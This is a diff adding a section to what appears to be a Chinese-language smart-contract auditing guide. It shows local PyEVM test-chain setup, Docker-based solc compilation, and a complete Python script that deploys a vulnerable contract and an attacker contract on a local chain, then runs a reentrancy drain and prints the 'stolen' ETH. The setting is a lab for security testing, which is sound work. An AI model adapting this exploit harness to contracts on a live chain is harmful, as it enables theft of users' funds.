@@ -2624,3 +2624,90 @@ contract PriceConsumer {
 **Slither upstream**: [github.com/crytic/slither](https://github.com/crytic/slither)
 **Foundry book**: [book.getfoundry.sh](https://book.getfoundry.sh)
 **SWC Registry**: [swcregistry.io](https://swcregistry.io)
+
+---
+
+## 23. Local EVM Testing + Docker solc Compilation (v0.2.5.2)
+
+> **来源**：2026-08-13 实战验证 — PyEVM 重入攻击成功（投入 1 ETH 提取 11 ETH）
+
+### 23.1 本地测试链（无需 Anvil/Hardhat）
+
+**F-BC-002**：SKILL 原文仅提及 Foundry/Hardhat。纯 Python 方案（更适合快速验证）：
+
+```bash
+# 安装（Python 3.11+）
+python3.11 -m pip install web3 eth-tester py-evm
+```
+
+```python
+# 启动本地 EVM 测试链
+from web3 import Web3
+from eth_tester import EthereumTester, PyEVMBackend
+w3 = Web3(Web3.EthereumTesterProvider(EthereumTester(PyEVMBackend())))
+deployer, victim, attacker = w3.eth.accounts[0:3]
+```
+
+**优势**：无需外部节点；PyEVM 完整 EVM 语义；快速部署/测试循环。
+
+### 23.2 Docker solc 跨平台编译（F-BC-003）
+
+macOS ARM64 / Linux ARM64 上 solc 安装困难。Docker 方案：
+
+```bash
+# 编译（挂载 $HOME 保证 colima/Docker Desktop 权限）
+docker run --rm -v ~/web3-lab:/src ethereum/solc:0.8.26 \
+  --bin --abi --optimize /src/vulnerable.sol -o /src/build --overwrite
+```
+
+**注意**：`ethereum/solc` 镜像是 linux/amd64；在 ARM64 上通过 QEMU 模拟运行（自动处理）。
+
+### 23.3 完整重入攻击脚本（F-BC-001）
+
+```python
+#!/usr/bin/env python3
+"""重入攻击验证脚本 — 参见 evidence/2026-08-13/"""
+import json, os
+from web3 import Web3
+from eth_tester import EthereumTester, PyEVMBackend
+
+# 编译产物路径（§23.2 产出）
+BUILD = os.path.expanduser('~/web3-lab/build')
+
+# 加载 ABI + bytecode
+vuln_abi = json.load(open(f'{BUILD}/Vulnerable.abi'))
+vuln_bin = open(f'{BUILD}/Vulnerable.bin').read().strip()
+atk_abi = json.load(open(f'{BUILD}/Attacker.abi'))
+atk_bin = open(f'{BUILD}/Attacker.bin').read().strip()
+
+# 启动本地链
+w3 = Web3(Web3.EthereumTesterProvider(EthereumTester(PyEVMBackend())))
+deployer, victim, atk_eoa = w3.eth.accounts[0:3]
+
+# 部署漏洞合约
+VC = w3.eth.contract(abi=vuln_abi, bytecode=vuln_bin)
+vuln_addr = w3.eth.wait_for_transaction_receipt(
+    VC.constructor().transact({'from': deployer})).contractAddress
+vuln = w3.eth.contract(address=vuln_addr, abi=vuln_abi)
+
+# Victim 存入 10 ETH
+vuln.functions.deposit().transact({'from': victim, 'value': Web3.to_wei(10, 'ether')})
+
+# 部署攻击合约
+AC = w3.eth.contract(abi=atk_abi, bytecode=atk_bin)
+atk_addr = w3.eth.wait_for_transaction_receipt(
+    AC.constructor(vuln_addr).transact({'from': atk_eoa})).contractAddress
+atk = w3.eth.contract(address=atk_addr, abi=atk_abi)
+
+# 重入攻击
+before = w3.eth.get_balance(atk_eoa)
+atk.functions.attack().transact({'from': atk_eoa, 'value': Web3.to_wei(1, 'ether')})
+# → Vulnerable 合约被掏空，Attacker 获得 11 ETH
+
+# 收款
+atk.functions.collect().transact({'from': atk_eoa})
+profit = Web3.from_wei(w3.eth.get_balance(atk_eoa) - before, 'ether')
+print(f"Stolen: ~{profit:.2f} ETH")
+```
+
+**攻击合约源码**：见 `evidence/2026-08-13/vulnerable.sol`（含 Vulnerable + Attacker 双合约）。
